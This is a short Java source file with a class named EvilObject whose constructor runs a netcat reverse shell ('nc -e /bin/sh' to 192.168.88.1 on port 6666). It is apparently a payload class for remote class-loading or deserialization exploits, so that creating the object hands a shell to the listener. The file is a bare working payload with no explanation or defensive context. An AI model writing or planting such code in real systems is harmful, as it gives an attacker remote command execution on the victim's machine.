public class EvilObject {
            public EvilObject() throws Exception {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"/bin/sh", "-c", "nc -e /bin/sh 192.168.88.1 6666"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            }
        }
        